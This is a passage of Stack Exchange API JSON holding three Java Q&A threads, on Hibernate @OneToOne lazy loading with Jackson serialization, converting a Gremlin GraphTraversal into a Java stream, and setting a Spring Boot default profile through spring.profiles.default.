href=\"https://docs.jboss.org/hibernate/orm/5.4/userguide/html_single/Hibernate_User_Guide.html#BytecodeEnhancement-enhancement\" rel=\"nofollow noreferrer\">hibernate performance enhancement doc</a> you also need a configuration property for hibernate, so in a Spring Boot App, please also include the following in your application.yml or properties file.</p>\n<pre><code>hibernate.enhancer.enableLazyInitialization = true\n</code></pre>\n<p>After you include this property, your entity must be updated to</p>\n<pre><code>@Entity\npublic class User extends AbstractEntity implements Serializable{\n\n    // Other fields related to user entity go here ..\n\n    @LazyToOne(LazyToOneOption.NO_PROXY)  &lt;------\n    @OneToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY, optional = false)\n    @JoinColumn(name = &quot;account_no&quot;, referencedColumnName = &quot;account_number&quot;)\n    private Account account;\n}\n\n@Entity\npublic class Account extends AbstractEntity implements Serializable{\n\n    // fields like account#, balance etc goes here..\n\n    @LazyToOne(LazyToOneOption.NO_PROXY) &lt;-----\n    @OneToOne (fetch = FetchType.LAZY)\n    private User user;\n\n}\n</code></pre>\n<p>All these are needed just for hibernate to enable the lazy loading functionality.</p>\n<p>Then you would still see it in your response, because Jackson would call the getter method while serializing so it will force hibernate to fetch the value. So you also need to inform jackson to not use this getter during serialization.</p>\n<p>So you must also update</p>\n<pre><code>  @Entity\n  public class User extends AbstractEntity implements Serializable{\n\n    @JsonIgnore &lt;--------\n    @JsonProperty(access =  JsonProperty.Access.WRITE_ONLY) &lt;-------\n    @LazyToOne(LazyToOneOption.NO_PROXY) \n    @OneToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY, optional = false)\n    @JoinColumn(name = &quot;account_no&quot;, referencedColumnName = &quot;account_number&quot;)\n    private Account account; \n</code></pre>\n<p>Hopefully after all this should you be able to not see the account response because of lazy loading.</p>\n"},{"tags":[],"owner":{"account_id":476019,"reputation":14699,"user_id":886697,"accept_rate":92,"display_name":"Stanislav Bashkyrtsev"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640272099,"creation_date":1640208126,"answer_id":70455238,"question_id":70414424,"body_markdown":"It&#39;s unfortunate that the question is misleading and it takes many comments to find out what you&#39;re asking. Finally I understand - you see the field in JSON and you don&#39;t want to. This is a purely Jackson-related question and Hibernate has nothing to do with it.\r\n\r\nThere are several ways you can take:\r\n\r\n### Use DTO\r\n\r\nThere&#39;s a good reason we don&#39;t use our Entities as part of JSON serialization - exactly because it&#39;s rare that they satisfy our JSON requirements. \r\n\r\nSo instead we create a special DTO class which maps exactly how we need it for a particular endpoint. We convert our Entity to the DTO (and it will not include `account` field) and then serialize DTO.\r\n\r\n### Using Jackson Views\r\n\r\nJackson has a notion of a [JsonView][1] - it lets you map the same object differently depending on the view that you request. This way you can make `account` field invisible to that particular endpoint.\r\n\r\n### Ignore properties\r\n\r\nAs was already hinted in the other response - you can `@JsonIgnore` the property or rid of its visibility or making it deserialize-only with WRITE_ONLY.\r\n\r\n### Jackson Hibernate module\r\n\r\nJackson has &quot;plugins&quot; specific for Hibernate: [jackson-datatype-hibernate][2]. They allow to be configured to ignore lazy fields and not initialize them. In such case Jackson will serialize null ([HibernateXModule.Feature][3]).\r\n\r\nThis is probably the worst option of all because you really don&#39;t want to tie how you optimize your work with DB and your presentation layer.\r\n\r\n\r\n  [1]: https://fasterxml.github.io/jackson-annotations/javadoc/2.6/com/fasterxml/jackson/annotation/JsonView.html\r\n  [2]: https://github.com/FasterXML/jackson-datatype-hibernate\r\n  [3]: http://fasterxml.github.io/jackson-datatype-hibernate/javadoc/h5/2.13/com/fasterxml/jackson/datatype/hibernate5/Hibernate5Module.Feature.html","title":"FetchType.LAZY not working for @OneToOne relation","body":"<p>It's unfortunate that the question is misleading and it takes many comments to find out what you're asking. Finally I understand - you see the field in JSON and you don't want to. This is a purely Jackson-related question and Hibernate has nothing to do with it.</p>\n<p>There are several ways you can take:</p>\n<h3>Use DTO</h3>\n<p>There's a good reason we don't use our Entities as part of JSON serialization - exactly because it's rare that they satisfy our JSON requirements.</p>\n<p>So instead we create a special DTO class which maps exactly how we need it for a particular endpoint. We convert our Entity to the DTO (and it will not include <code>account</code> field) and then serialize DTO.</p>\n<h3>Using Jackson Views</h3>\n<p>Jackson has a notion of a <a href=\"https://fasterxml.github.io/jackson-annotations/javadoc/2.6/com/fasterxml/jackson/annotation/JsonView.html\" rel=\"nofollow noreferrer\">JsonView</a> - it lets you map the same object differently depending on the view that you request. This way you can make <code>account</code> field invisible to that particular endpoint.</p>\n<h3>Ignore properties</h3>\n<p>As was already hinted in the other response - you can <code>@JsonIgnore</code> the property or rid of its visibility or making it deserialize-only with WRITE_ONLY.</p>\n<h3>Jackson Hibernate module</h3>\n<p>Jackson has &quot;plugins&quot; specific for Hibernate: <a href=\"https://github.com/FasterXML/jackson-datatype-hibernate\" rel=\"nofollow noreferrer\">jackson-datatype-hibernate</a>. They allow to be configured to ignore lazy fields and not initialize them. In such case Jackson will serialize null (<a href=\"http://fasterxml.github.io/jackson-datatype-hibernate/javadoc/h5/2.13/com/fasterxml/jackson/datatype/hibernate5/Hibernate5Module.Feature.html\" rel=\"nofollow noreferrer\">HibernateXModule.Feature</a>).</p>\n<p>This is probably the worst option of all because you really don't want to tie how you optimize your work with DB and your presentation layer.</p>\n"}],"owner":{"account_id":5449054,"reputation":1020,"user_id":4334502,"accept_rate":30,"display_name":"ever alian"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2267,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"answer_count":2,"score":4,"last_activity_date":1640272099,"creation_date":1639940043,"question_id":70414424,"body_markdown":"I&#39;m using JPA2 and Springboot2X. Trying to define a simple one-to-one relationship in `User` and `Account` tables.\r\n`User` is the parent while `Account` is the child. The relationship is from parent to child. Followed [this][1].\r\n\r\n`User` table has a column `account_no` to hold the account number which is the primary key of the `Account` table. So `User` holds the foreign key.\r\n\r\n    @Entity\r\n    public class Account extends AbstractEntity implements Serializable{\r\n\r\n        // fields like account#, balance etc goes here..\r\n\r\n        @OneToOne (fetch = FetchType.LAZY)\r\n\t    private User user;\r\n\t\r\n    }\r\n\r\n    @Entity\r\n    public class User extends AbstractEntity implements Serializable{\r\n\r\n        // Other fields related to user entity go here ..\r\n\r\n        @OneToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY, optional = false)\r\n        @JoinColumn(name = &quot;account_no&quot;, referencedColumnName = &quot;account_number&quot;)\r\n\t    private Account account;\r\n    }\r\n\r\n\r\nSaving is working properly. But when I fetch a user ( `User user =  userRp.findByUserID(userid);`), I get data from both tables. My question is when I define `fetch = FetchType.LAZY` why the account table data is fetching? I only want the user data to be in the output as when I run the select query in the `User` table.\r\n\r\nOutput : \r\n\r\n        {\r\n        &quot;id&quot;: 1,\r\n        &quot;userID&quot;: &quot;xxxxx&quot;,\r\n        &quot;firstName&quot;: &quot;Dsd&quot;,\r\n        &quot;llastName&quot;: &quot;cccc&quot;,\r\n        &quot;email&quot;: &quot;danqsaa@brown&quot;,\r\n        &quot;creation_date&quot;: &quot;2021-12-19 19:41&quot;,\r\n        &quot;modified_date&quot;: &quot;2021-12-19 19:41&quot;,\r\n        &quot;account&quot;: {\r\n            &quot;id&quot;: 2,           \r\n            &quot;accountNo&quot;: 6848982326,\r\n            &quot;balance&quot;: 4000.0,\r\n            &quot;creationUser&quot;: &quot;xxx&quot;,\r\n            &quot;creation_date&quot;: &quot;2021-12-19 19:41&quot;,\r\n            &quot;modified_date&quot;: &quot;2021-12-19 19:41&quot;,\r\n            &quot;transactions&quot;: []\r\n        }\r\n    }\r\nDB output\r\n[![enter image description here][2]][2]\r\n\r\n[![enter image description here][3]][3]\r\n-----\r\nAdded below RestController, Service, and Repo details.\r\n\r\n    @RestController\r\n    public class UserController {\r\n    \r\n        @GetMapping(&quot;/users/{userID}&quot;)\r\n        \tpublic ResponseEntity&lt;Object&gt; getUser(@PathVariable(&quot;userID&quot;) String userID){\r\n        \t\t       return new ResponseEntity&lt;&gt;(userServiceImpl.getUserByID(userID), HttpStatus.OK)); \r\n        \t}\r\n    }\r\n\r\n    @Service\r\n    public class UserService {\r\n    \r\n     // injected user repo\r\n    public User getUserByID(String userID){\r\n    \t\treturn  userRepo.findByUserID(userID);\t\t\r\n    \t}\r\n    }\r\n\r\n    public interface UsersRepository extends CrudRepository&lt;User, String&gt; {\r\n         User findByUserID(String userID);\r\n    }\r\n\r\n  [1]: https://stackoverflow.com/questions/8214973/which-way-should-a-foreign-key-go-in-a-one-to-one-relationship\r\n  [2]: https://i.stack.imgur.com/8DXNJ.png\r\n  [3]: https://i.stack.imgur.com/gJvpM.png\r\n\r\n","title":"FetchType.LAZY not working for @OneToOne relation","body":"<p>I'm using JPA2 and Springboot2X. Trying to define a simple one-to-one relationship in <code>User</code> and <code>Account</code> tables.\n<code>User</code> is the parent while <code>Account</code> is the child. The relationship is from parent to child. Followed <a href=\"https://stackoverflow.com/questions/8214973/which-way-should-a-foreign-key-go-in-a-one-to-one-relationship\">this</a>.</p>\n<p><code>User</code> table has a column <code>account_no</code> to hold the account number which is the primary key of the <code>Account</code> table. So <code>User</code> holds the foreign key.</p>\n<pre><code>@Entity\npublic class Account extends AbstractEntity implements Serializable{\n\n    // fields like account#, balance etc goes here..\n\n    @OneToOne (fetch = FetchType.LAZY)\n    private User user;\n\n}\n\n@Entity\npublic class User extends AbstractEntity implements Serializable{\n\n    // Other fields related to user entity go here ..\n\n    @OneToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY, optional = false)\n    @JoinColumn(name = &quot;account_no&quot;, referencedColumnName = &quot;account_number&quot;)\n    private Account account;\n}\n</code></pre>\n<p>Saving is working properly. But when I fetch a user ( <code>User user =  userRp.findByUserID(userid);</code>), I get data from both tables. My question is when I define <code>fetch = FetchType.LAZY</code> why the account table data is fetching? I only want the user data to be in the output as when I run the select query in the <code>User</code> table.</p>\n<p>Output :</p>\n<pre><code>    {\n    &quot;id&quot;: 1,\n    &quot;userID&quot;: &quot;xxxxx&quot;,\n    &quot;firstName&quot;: &quot;Dsd&quot;,\n    &quot;llastName&quot;: &quot;cccc&quot;,\n    &quot;email&quot;: &quot;danqsaa@brown&quot;,\n    &quot;creation_date&quot;: &quot;2021-12-19 19:41&quot;,\n    &quot;modified_date&quot;: &quot;2021-12-19 19:41&quot;,\n    &quot;account&quot;: {\n        &quot;id&quot;: 2,           \n        &quot;accountNo&quot;: 6848982326,\n        &quot;balance&quot;: 4000.0,\n        &quot;creationUser&quot;: &quot;xxx&quot;,\n        &quot;creation_date&quot;: &quot;2021-12-19 19:41&quot;,\n        &quot;modified_date&quot;: &quot;2021-12-19 19:41&quot;,\n        &quot;transactions&quot;: []\n    }\n}\n</code></pre>\n<p>DB output\n<a href=\"https://i.stack.imgur.com/8DXNJ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/8DXNJ.png\" alt=\"enter image description here\" /></a></p>\n<h2><a href=\"https://i.stack.imgur.com/gJvpM.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/gJvpM.png\" alt=\"enter image description here\" /></a></h2>\n<p>Added below RestController, Service, and Repo details.</p>\n<pre><code>@RestController\npublic class UserController {\n\n    @GetMapping(&quot;/users/{userID}&quot;)\n        public ResponseEntity&lt;Object&gt; getUser(@PathVariable(&quot;userID&quot;) String userID){\n                   return new ResponseEntity&lt;&gt;(userServiceImpl.getUserByID(userID), HttpStatus.OK)); \n        }\n}\n\n@Service\npublic class UserService {\n\n // injected user repo\npublic User getUserByID(String userID){\n        return  userRepo.findByUserID(userID);      \n    }\n}\n\npublic interface UsersRepository extends CrudRepository&lt;User, String&gt; {\n     User findByUserID(String userID);\n}\n</code></pre>\n"},{"tags":["java","java-stream","gremlin","graph-databases","tinkerpop"],"comments":[{"owner":{"account_id":7115613,"reputation":14979,"user_id":5442034,"display_name":"Kelvin Lawrence"},"score":0,"creation_date":1640193639,"post_id":70452707,"comment_id":124539545,"body_markdown":"Have you tried using `toList()` rather than `iterate()` ? The `iterate` terminal step includes an implicit `none` step and therefore does not return any result to the caller. Here is a related question. https://stackoverflow.com/questions/59024185/tinkerpop-gremlin-python-next-vs-iterate","body":"Have you tried using <code>toList()</code> rather than <code>iterate()</code> ? The <code>iterate</code> terminal step includes an implicit <code>none</code> step and therefore does not return any result to the caller. Here is a related question. <a href=\"https://stackoverflow.com/questions/59024185/tinkerpop-gremlin-python-next-vs-iterate\" title=\"tinkerpop gremlin python next vs iterate\">stackoverflow.com/questions/59024185/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":2053237,"reputation":45626,"user_id":1831717,"display_name":"stephen mallette"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640193964,"creation_date":1640193964,"answer_id":70452874,"question_id":70452707,"body_markdown":"When you call `iterate()` it returns a `GraphTraversal` and you can then call `toStream()` on that, but it will always be empty. You should omit the `iterate()` if you intend to return values to your `Stream`. In short, simply  do `values().toStream()`.","title":"Convert GraphTraversal&lt;Vertex, Map&lt;Object, List&gt;&gt; into Java8 stream","body":"<p>When you call <code>iterate()</code> it returns a <code>GraphTraversal</code> and you can then call <code>toStream()</code> on that, but it will always be empty. You should omit the <code>iterate()</code> if you intend to return values to your <code>Stream</code>. In short, simply  do <code>values().toStream()</code>.</p>\n"}],"owner":{"account_id":8621268,"reputation":953,"user_id":6456107,"display_name":"Alter"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":119,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70452874,"answer_count":1,"score":0,"last_activity_date":1640271314,"creation_date":1640193181,"question_id":70452707,"body_markdown":"I have a result of a query to `graphDB` which returns `GraphTraversal&lt;Vertex, Map&lt;Object, List&gt;&gt; values`. By using the default methods `values.iterate().toStream()` it should return a Stream of `Stream&lt;Map&lt;Object, List&gt;&gt;` which I can handle as a Java8 stream, but for some reason, it does not work, repeat, by using the default methods from gemlin API to get the stream. \r\n\r\nNote: By using a `while` I can iterate over it, that&#39;s fine, but I need to do some more complex operations that will be simplified by using `Java8 Streams`, but, as I said, is not working, even using `tinkerpop` default methods. Any idea?\r\n\r\nThere are no errors, but the stream is empty for some reason.","title":"Convert GraphTraversal&lt;Vertex, Map&lt;Object, List&gt;&gt; into Java8 stream","body":"<p>I have a result of a query to <code>graphDB</code> which returns <code>GraphTraversal&lt;Vertex, Map&lt;Object, List&gt;&gt; values</code>. By using the default methods <code>values.iterate().toStream()</code> it should return a Stream of <code>Stream&lt;Map&lt;Object, List&gt;&gt;</code> which I can handle as a Java8 stream, but for some reason, it does not work, repeat, by using the default methods from gemlin API to get the stream.</p>\n<p>Note: By using a <code>while</code> I can iterate over it, that's fine, but I need to do some more complex operations that will be simplified by using <code>Java8 Streams</code>, but, as I said, is not working, even using <code>tinkerpop</code> default methods. Any idea?</p>\n<p>There are no errors, but the stream is empty for some reason.</p>\n"},{"tags":["java","spring-boot","spring-profiles"],"comments":[{"owner":{"account_id":533485,"reputation":2992,"user_id":903885,"accept_rate":87,"display_name":"Hasan Can Saral"},"score":0,"creation_date":1571238426,"post_id":58416384,"comment_id":103175756,"body_markdown":"Can you try `spring.profiles.active=dev`?","body":"Can you try <code>spring.profiles.active=dev</code>?"},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571238538,"post_id":58416384,"comment_id":103175835,"body_markdown":"@HasanCanSaral Are you meaning that add `spring.profile.active=dev` in `application-dev.properties` ?","body":"@HasanCanSaral Are you meaning that add <code>spring.profile.active=dev</code> in <code>application-dev.properties</code> ?"},{"owner":{"account_id":533485,"reputation":2992,"user_id":903885,"accept_rate":87,"display_name":"Hasan Can Saral"},"score":0,"creation_date":1571238580,"post_id":58416384,"comment_id":103175859,"body_markdown":"Yes. It is working as expected. If you had `spring.profiles.active=someOtherProfile` you would have the `someOtherProfile` activated. If you have nothing, by `spring.profiles.default` you set your fallback to `dev`.","body":"Yes. It is working as expected. If you had <code>spring.profiles.active=someOtherProfile</code> you would have the <code>someOtherProfile</code> activated. If you have nothing, by <code>spring.profiles.default</code> you set your fallback to <code>dev</code>."},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571238769,"post_id":58416384,"comment_id":103175975,"body_markdown":"@HasanCanSaral So, I didn&#39;t set up *any active profile*. and I would expect `dev` will be activate. Because default profile is `dev`","body":"@HasanCanSaral So, I didn&#39;t set up <i>any active profile</i>. and I would expect <code>dev</code> will be activate. Because default profile is <code>dev</code>"},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571239920,"post_id":58416384,"comment_id":103176631,"body_markdown":"@Antoniossss I can&#39;t say Dev is activated. Dev is set up as default. \nAnd if there is no activated profile, default profile might be activated. But it is not.\nIt&#39;s a problem","body":"@Antoniossss I can&#39;t say Dev is activated. Dev is set up as default.  And if there is no activated profile, default profile might be activated. But it is not. It&#39;s a problem"},{"owner":{"account_id":1658807,"reputation":31819,"user_id":1527544,"accept_rate":54,"display_name":"Antoniossss"},"score":0,"creation_date":1571239922,"post_id":58416384,"comment_id":103176633,"body_markdown":"change `spring.profiles.default= dev`  to `spring.profiles.default=dev` ?? Idk should work just like that imho.","body":"change <code>spring.profiles.default= dev</code>  to <code>spring.profiles.default=dev</code> ?? Idk should work just like that imho."},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571239984,"post_id":58416384,"comment_id":103176667,"body_markdown":"@Antoniossss still doesn&#39;t work :-l ...","body":"@Antoniossss still doesn&#39;t work :-l ..."},{"owner":{"account_id":13798611,"reputation":37875,"user_id":9959152,"display_name":"Ryuzaki L"},"score":0,"creation_date":1571241491,"post_id":58416384,"comment_id":103177466,"body_markdown":"can you point me to docs where do you find this property `spring.profile.default ` ? @MinwooKang","body":"can you point me to docs where do you find this property <code>spring.profile.default </code> ? @MinwooKang"},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571241916,"post_id":58416384,"comment_id":103177646,"body_markdown":"@Deadpool Actually I was following this article(https://www.javacodegeeks.com/2019/07/profiles-spring-boot-application.html#respond), but give me some time to find from docs.","body":"@Deadpool Actually I was following this article(<a href=\"https://www.javacodegeeks.com/2019/07/profiles-spring-boot-application.html#respond\" rel=\"nofollow noreferrer\">javacodegeeks.com/2019/07/&hellip;</a>), but give me some time to find from docs."},{"owner":{"account_id":13798611,"reputation":37875,"user_id":9959152,"display_name":"Ryuzaki L"},"score":0,"creation_date":1571242003,"post_id":58416384,"comment_id":103177690,"body_markdown":"I don&#39;t think spring has that property, you need to use `spring.profiles.active` @MinwooKang https://docs.spring.io/spring-boot/docs/current/reference/html/common-application-properties.html","body":"I don&#39;t think spring has that property, you need to use <code>spring.profiles.active</code> @MinwooKang <a href=\"https://docs.spring.io/spring-boot/docs/current/reference/html/common-application-properties.html\" rel=\"nofollow noreferrer\">docs.spring.io/spring-boot/docs/current/reference/html/&hellip;</a>"},{"owner":{"account_id":1658807,"reputation":31819,"user_id":1527544,"accept_rate":54,"display_name":"Antoniossss"},"score":1,"creation_date":1571251356,"post_id":58416384,"comment_id":103181903,"body_markdown":"It is/was a bug - https://github.com/spring-projects/spring-boot/issues/1219","body":"It is/was a bug - <a href=\"https://github.com/spring-projects/spring-boot/issues/1219\" rel=\"nofollow noreferrer\">github.com/spring-projects/spring-boot/issues/1219</a>"},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571271114,"post_id":58416384,"comment_id":103188530,"body_markdown":"@Deadpool FYI : http://docs.spring.io/spring/docs/4.2.0.RELEASE/spring-framework-reference/htmlsingle/#beans-definition-profiles-default","body":"@Deadpool FYI : <a href=\"http://docs.spring.io/spring/docs/4.2.0.RELEASE/spring-framework-reference/htmlsingle/#beans-definition-profiles-default\" rel=\"nofollow noreferrer\">docs.spring.io/spring/docs/4.2.0.RELEASE/&hellip;</a>"},{"owner":{"account_id":13798611,"reputation":37875,"user_id":9959152,"display_name":"Ryuzaki L"},"score":0,"creation_date":1571271272,"post_id":58416384,"comment_id":103188557,"body_markdown":"it is new thing to know @MinwooKang thanks","body":"it is new thing to know @MinwooKang thanks"},{"owner":{"account_id":13798611,"reputation":37875,"user_id":9959152,"display_name":"Ryuzaki L"},"score":0,"creation_date":1571271466,"post_id":58416384,"comment_id":103188599,"body_markdown":"so you have set this property `spring.profile.default = dev` in application.properties? or how are you passing it to spring application? @MinwooKang","body":"so you have set this property <code>spring.profile.default = dev</code> in application.properties? or how are you passing it to spring application? @MinwooKang"},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571272003,"post_id":58416384,"comment_id":103188705,"body_markdown":"Yes I have set this property to change default profiles. But It didn&#39;t work what I expected.\n\nBut I&#39;ve found out how to change default profile. I will update in description","body":"Yes I have set this property to change default profiles. But It didn&#39;t work what I expected.  But I&#39;ve found out how to change default profile. I will update in description"},{"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"score":0,"creation_date":1571272614,"post_id":58416384,"comment_id":103188833,"body_markdown":"@Deadpool Yes that&#39;s the answer what I want :) Thanks","body":"@Deadpool Yes that&#39;s the answer what I want :) Thanks"}],"answers":[{"tags":[],"owner":{"account_id":7112771,"reputation":6072,"user_id":5440084,"display_name":"Haagenti"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1571239358,"creation_date":1571238528,"answer_id":58416501,"question_id":58416384,"body_markdown":"You have only configured the default profile.\r\nYou need to set an active profile like `spring.profiles.active=dev`\r\nin your app properties. For injecting current active profile, \r\n\r\n    @Value(&quot;${spring.profiles.active}&quot;)\r\n    private String currentActiveEnv;","title":"spring boot not loading default profile while using spring.profile.default in application.properties","body":"<p>You have only configured the default profile.\nYou need to set an active profile like <code>spring.profiles.active=dev</code>\nin your app properties. For injecting current active profile, </p>\n\n<pre><code>@Value(\"${spring.profiles.active}\")\nprivate String currentActiveEnv;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":533485,"reputation":2992,"user_id":903885,"accept_rate":87,"display_name":"Hasan Can Saral"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1571238689,"creation_date":1571238689,"answer_id":58416545,"question_id":58416384,"body_markdown":"You set your default profile fallback to `dev` with `spring.profiles.default=dev`. If you had `spring.profiles.active=someOtherProfile`, you would have `someOtherProfile` activated.\r\n\r\n&gt; 2019-10-16 23:17:02.926 INFO 64099 --- [ main]\r\n&gt; c.e.s.SpringbootdemoappApplication : No active profile set, falling\r\n&gt; back to default profiles: dev\r\n\r\nThis log says that `dev` profile is the active one, since you don&#39;t have any explicit profile activated.","title":"spring boot not loading default profile while using spring.profile.default in application.properties","body":"<p>You set your default profile fallback to <code>dev</code> with <code>spring.profiles.default=dev</code>. If you had <code>spring.profiles.active=someOtherProfile</code>, you would have <code>someOtherProfile</code> activated.</p>\n\n<blockquote>\n  <p>2019-10-16 23:17:02.926 INFO 64099 --- [ main]\n  c.e.s.SpringbootdemoappApplication : No active profile set, falling\n  back to default profiles: dev</p>\n</blockquote>\n\n<p>This log says that <code>dev</code> profile is the active one, since you don't have any explicit profile activated.</p>\n"},{"tags":[],"owner":{"account_id":13798611,"reputation":37875,"user_id":9959152,"display_name":"Ryuzaki L"},"down_vote_count":0,"up_vote_count":4,"is_accepted":true,"score":4,"last_activity_date":1571272268,"creation_date":1571272268,"answer_id":58423307,"question_id":58416384,"body_markdown":"The problem is you are passing this properties after application is loaded, you need to provide this property while application is booting up\r\n\r\n**Pass it as JVM args**\r\n\r\n    java -jar -Dspring.profiles.default=dev myproject.jar\r\n\r\n**Pass as environment variable**\r\n\r\n    java -jar myproject.jar --spring.profiles.default=dev\r\n\r\n**System variable**\r\n\r\n    SPRING_PROFILES_DEFAULT=dev","title":"spring boot not loading default profile while using spring.profile.default in application.properties","body":"<p>The problem is you are passing this properties after application is loaded, you need to provide this property while application is booting up</p>\n\n<p><strong>Pass it as JVM args</strong></p>\n\n<pre><code>java -jar -Dspring.profiles.default=dev myproject.jar\n</code></pre>\n\n<p><strong>Pass as environment variable</strong></p>\n\n<pre><code>java -jar myproject.jar --spring.profiles.default=dev\n</code></pre>\n\n<p><strong>System variable</strong></p>\n\n<pre><code>SPRING_PROFILES_DEFAULT=dev\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1649239,"reputation":51,"user_id":1520139,"display_name":"Subhash Gaikwad"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640271063,"creation_date":1640271063,"answer_id":70463728,"question_id":58416384,"body_markdown":"Please go through with following link -\r\n\r\nhttps://medium.com/@khandkesoham7/profiling-with-spring-boot-408b33f8a25f\r\n\r\nthat guy has explained well \r\n\r\nand to verify the or command for generate the build follow the following command \r\n\r\n&gt; `mvn -Ppreprod package -DskipTests clean verify`","title":"spring boot not loading default profile while using spring.profile.default in application.properties","body":"<p>Please go through with following link -</p>\n<p><a href=\"https://medium.com/@khandkesoham7/profiling-with-spring-boot-408b33f8a25f\" rel=\"nofollow noreferrer\">https://medium.com/@khandkesoham7/profiling-with-spring-boot-408b33f8a25f</a></p>\n<p>that guy has explained well</p>\n<p>and to verify the or command for generate the build follow the following command</p>\n<blockquote>\n<p><code>mvn -Ppreprod package -DskipTests clean verify</code></p>\n</blockquote>\n"}],"owner":{"account_id":9188179,"reputation":75,"user_id":9346490,"display_name":"Minwoo Kang"},"comment_count":16,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":21278,"favorite_count":0,"down_vote_count":0,"up_vote_count":5,"accepted_answer_id":58423307,"answer_count":4,"score":5,"last_activity_date":1640271063,"creation_date":1571238131,"question_id":58416384,"body_markdown":"**FYI : I swear there is no activating profile configuration such as -D or run configuration**\r\n\r\n\r\n#Goal#\r\n  When application is booted up without any activating profile, the `dev` profile is activated as a default.\r\n\r\n#Problem#\r\n\r\nI&#39;ve set `spring.profile.default = dev` , and I would expect that the dev profile is activated. But it is not.\r\n\r\n\r\n\r\n#What I did#\r\n`Run Environment`\r\n\r\nSpring-Boot-version : 2.1.2 Release\r\n\r\n`What I&#39;m referred`\r\n\r\n1) How to use profiles in Spring Boot Application - \r\nhttps://www.javacodegeeks.com/2019/07/profiles-spring-boot-application.html#respond\r\n\r\n\r\n\r\n**Here&#39;s Code What I did**\r\n\r\n\r\n\r\n`/resources/application.properties`\r\n```\r\nspring.profiles.default= dev\r\n\r\napplication.environment=This is a &quot;Default&quot; Environment\r\n```\r\n\r\n\r\n`/resources/application-dev.properties`\r\n```\r\napplication.environment=This is a &quot;dev&quot; Environment\r\nserver.port= 8082\r\n```\r\n\r\n\r\n`/ProfileController.java`\r\n```\r\n@RestController\r\n@RequestMapping(&quot;/v1&quot;)\r\npublic class ProfileController {\r\n\r\n    @Value(&quot;${application.environment}&quot;)\r\n    private String applicationEnv;\r\n\r\n    @GetMapping\r\n    public String getApplicationEnv(){\r\n        return applicationEnv;\r\n    }\r\n}\r\n```\r\n\r\n#Result#\r\n\r\nlocalhost/v1 =&gt; This is a &quot;Default&quot; Environment\r\n\r\nAnd \r\n\r\nI&#39;ve found out the default profile is set up as `dev` correctly.\r\n\r\nThis is my spring-boot log.\r\n&gt;2019-10-16 23:17:02.926  INFO 64099 --- [           main] c.e.s.SpringbootdemoappApplication       : No active profile set, falling back to default profiles: dev\r\n\r\n#Add another log for server port#\r\n\r\n&gt;2019-10-17 00:25:03.837  INFO 68318 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8083 (http)\r\n\r\nThe reason that I add is it doesn&#39;t seem a problem related with Injection.\r\n\r\n\r\n\r\n#Time to Close this question#\r\n\r\nThe first goal that I want to achieve is change default profile.\r\nFrom spring docs(https://docs.spring.io/spring/docs/4.2.0.RELEASE/spring-framework-reference/htmlsingle/#beans-definition-profiles-default), default profile can be changed as setting `spring.profiles.default` in `application.properties`.\r\n\r\nBut it seems kind of bug (Thanks @Antoniossss). Even if I&#39;ve set that in `application.properties` and the console showed `No active profile set, falling back to default profiles: dev`.\r\nHowever still `dev` profile wasn&#39;t activated.\r\n\r\nThe thing that I&#39;ve found out is **changing default profile should be done before loading application.properties**.\r\n\r\nIt means if changing default profile is described in `application.properties`, it&#39;s too late.(IDK why though, I can&#39;t figure out because there are so many layers in Spring ...)\r\nIf d&#233;faut profile is set up using `-Dspring.default.profile = dev` , it&#39;s working properly. \r\n\r\nFrom https://github.com/spring-projects/spring-boot/issues/1219:\r\n\r\n&gt;You can&#39;t change the default profile by declaring it in a config file. It has to be in place before the config files are read.\r\n\r\n","title":"spring boot not loading default profile while using spring.profile.default in application.properties","body":"<p><strong>FYI : I swear there is no activating profile configuration such as -D or run configuration</strong></p>\n\n<h1>Goal</h1>\n\n<p>When application is booted up without any activating profile, the <code>dev</code> profile is activated as a default.</p>\n\n<h1>Problem</h1>\n\n<p>I've set <code>spring.profile.default = dev</code> , and I would expect that the dev profile is activated. But it is not.</p>\n\n<h1>What I did</h1>\n\n<p><code>Run Environment</code></p>\n\n<p>Spring-Boot-version : 2.1.2 Release</p>\n\n<p><code>What I'm referred</code></p>\n\n<p>1) How to use profiles in Spring Boot Application - \n<a href=\"https://www.javacodegeeks.com/2019/07/profiles-spring-boot-application.html#respond\" rel=\"nofollow 